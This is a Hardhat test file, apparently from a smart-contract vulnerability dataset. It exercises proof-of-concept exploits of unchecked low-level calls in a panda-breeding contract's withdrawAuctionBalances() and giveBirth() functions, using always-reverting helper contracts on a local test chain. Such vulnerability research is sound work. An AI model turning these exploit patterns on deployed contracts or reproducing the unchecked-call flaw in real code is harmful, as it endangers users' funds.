const {
  loadFixture,
  mine,
  setBalance,
} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { getContractAddress } = require("@ethersproject/address");
const path = require("path");
const fs = require("fs");

describe("attack unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol", function () {
  let owner, amount;

  async function deployContracts() {
    [owner] = await ethers.getSigners();
    amount = ethers.parseEther("1.0");

    let ownerNonce = (await owner.getNonce()) + 1;
    let futureAddress = getContractAddress({
      from: owner.address,
      nonce: ownerNonce,
    });

    await owner.sendTransaction({
      to: futureAddress,
      value: amount,
    });
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol/PandaCore.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const PandaCore = await ethers.getContractFactory(json.abi, json.bytecode);
    const contract = await PandaCore.connect(owner).deploy();

    const GeneScience = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3_attack.sol:GeneScience",
    );
    const geneScience = await GeneScience.connect(owner).deploy();
    await contract.connect(owner).setGeneScienceAddress(geneScience.target);

    const PandaCaller = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3_attack.sol:PandaCaller",
    );
    const pandaCaller = await PandaCaller.connect(owner).deploy(
      contract.target,
    );
    await contract.connect(owner).setCFO(pandaCaller.target);

    const PandaCallerSuccess = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3_attack.sol:PandaCallerSuccess",
    );
    const pandaCallerSuccess = await PandaCallerSuccess.connect(owner).deploy(
      contract.target,
    );

    const MyERC721 = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3_attack.sol:MyERC721",
    );
    const nft = await MyERC721.connect(owner).deploy();

    const MyERC721Success = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3_attack.sol:MyERC721Success",
    );
    const nftSuccess = await MyERC721Success.connect(owner).deploy();

    const salePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol/SaleClockAuction.json",
    );
    const saleJson = JSON.parse(fs.readFileSync(salePath));
    const SaleClockAuction = await ethers.getContractFactory(
      saleJson.abi,
      saleJson.bytecode,
    );
    const saleAuction = await SaleClockAuction.connect(owner).deploy(
      nft.target,
      10,
    );
    await setBalance(saleAuction.target, amount);

    const saleAuctionSuccess = await SaleClockAuction.connect(owner).deploy(
      nftSuccess.target,
      10,
    );
    await setBalance(saleAuctionSuccess.target, amount);

    const siringPath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol/SiringClockAuction.json",
    );
    const siringJson = JSON.parse(fs.readFileSync(siringPath));
    const SiringClockAuction = await ethers.getContractFactory(
      siringJson.abi,
      siringJson.bytecode,
    );
    const siringAuction = await SiringClockAuction.connect(owner).deploy(
      contract.target,
      10,
    );
    await setBalance(siringAuction.target, amount);
    return {
      pandaCaller,
      contract,
      saleAuction,
      siringAuction,
      nft,
      nftSuccess,
      saleAuctionSuccess,
      pandaCallerSuccess,
    };
  }

  it("sanity check: unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol in function withdrawAuctionBalances()", async function () {
    const { contract, saleAuctionSuccess, siringAuction } =
      await loadFixture(deployContracts);
    await expect(
      saleAuctionSuccess.connect(owner).transferOwnership(contract.target),
    ).not.be.reverted;

    expect(
      await ethers.provider.getBalance(saleAuctionSuccess.target),
    ).to.be.equal(amount);
    expect(await ethers.provider.getBalance(siringAuction.target)).to.be.equal(
      amount,
    );

    await contract.connect(owner).setSiringAuctionAddress(siringAuction.target);
    await contract
      .connect(owner)
      .setSaleAuctionAddress(saleAuctionSuccess.target);

    await expect(contract.connect(owner).withdrawAuctionBalances()).to.not.be
      .reverted;

    expect(
      await ethers.provider.getBalance(saleAuctionSuccess.target),
    ).to.be.equal(0);
    expect(await ethers.provider.getBalance(siringAuction.target)).to.be.equal(
      0,
    );
  });

  it("sanity check: unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol in function giveBirth()", async function () {
    const { pandaCallerSuccess, contract, saleAuction, siringAuction } =
      await loadFixture(deployContracts);
    await contract.connect(owner).setCFO(pandaCallerSuccess.target);
    await contract.connect(owner).setSiringAuctionAddress(siringAuction.target);
    await contract.connect(owner).setSaleAuctionAddress(saleAuction.target);
    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(
      amount,
    );
    expect(
      await ethers.provider.getBalance(pandaCallerSuccess.target),
    ).to.be.equal(0);
    await expect(pandaCallerSuccess.withdraw()).to.not.be.reverted;
    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(
      ethers.parseEther("0.002"),
    );
    expect(
      await ethers.provider.getBalance(pandaCallerSuccess.target),
    ).to.be.equal(ethers.parseEther("0.998"));

    await contract.connect(owner).init();
    await contract.connect(owner).unpause();

    await contract.connect(owner).createWizzPanda([1, 1], 0, owner.address);
    await contract.connect(owner).createWizzPanda([2, 2], 0, owner.address);

    await contract.connect(owner).breedWithAuto(2, 1, { value: amount });

    await mine(10000);

    await expect(pandaCallerSuccess.call(2, [3, 3], [100, 0]))
      .to.emit(contract, "Birth")
      .withArgs(owner.address, 3, 2, 1, [3, 3]);

    // caller does not get the reward
    expect(
      await ethers.provider.getBalance(pandaCallerSuccess.target),
    ).to.be.equal(amount);
  });

  it("exploit unchecked low level call vulnerability in function withdrawAuctionBalances()", async function () {
    const { pandaCaller, contract, saleAuction, siringAuction, nft } =
      await loadFixture(deployContracts);
    await expect(
      owner.sendTransaction({
        to: nft.target,
        value: amount,
      }),
    ).to.be.revertedWith("I always revert!");

    await saleAuction.connect(owner).transferOwnership(contract.target);

    expect(await ethers.provider.getBalance(saleAuction.target)).to.be.equal(
      amount,
    );
    expect(await ethers.provider.getBalance(siringAuction.target)).to.be.equal(
      amount,
    );

    await contract.connect(owner).setSiringAuctionAddress(siringAuction.target);
    await contract.connect(owner).setSaleAuctionAddress(saleAuction.target);

    await expect(contract.connect(owner).withdrawAuctionBalances()).to.not.be
      .reverted;

    expect(await ethers.provider.getBalance(saleAuction.target)).to.be.equal(
      amount,
    );
    expect(await ethers.provider.getBalance(siringAuction.target)).to.be.equal(
      0,
    );
  });

  it("exploit unchecked low level call vulnerability in function giveBirth()", async function () {
    const { pandaCaller, contract, saleAuction, siringAuction, nft } =
      await loadFixture(deployContracts);
    await contract.connect(owner).setSiringAuctionAddress(siringAuction.target);
    await contract.connect(owner).setSaleAuctionAddress(saleAuction.target);
    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(
      amount,
    );
    expect(await ethers.provider.getBalance(pandaCaller.target)).to.be.equal(0);
    await expect(
      owner.sendTransaction({
        to: pandaCaller.target,
        value: amount,
      }),
    ).to.be.revertedWith("I always revert!");

    await expect(pandaCaller.withdraw()).to.not.be.reverted;
    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(
      amount,
    );
    expect(await ethers.provider.getBalance(pandaCaller.target)).to.be.equal(0);

    await contract.connect(owner).init();
    await contract.connect(owner).unpause();

    await contract.connect(owner).createWizzPanda([1, 1], 0, owner.address);
    await contract.connect(owner).createWizzPanda([2, 2], 0, owner.address);

    await contract.connect(owner).breedWithAuto(2, 1, { value: amount });

    await mine(10000);

    // giveBirth function ends even when the call to the external contract fails
    await expect(pandaCaller.call(2, [3, 3], [100, 0]))
      .to.emit(contract, "Birth")
      .withArgs(owner.address, 3, 2, 1, [3, 3]);

    // caller does not get the reward
    expect(await ethers.provider.getBalance(pandaCaller.target)).to.be.equal(0);
  });
});
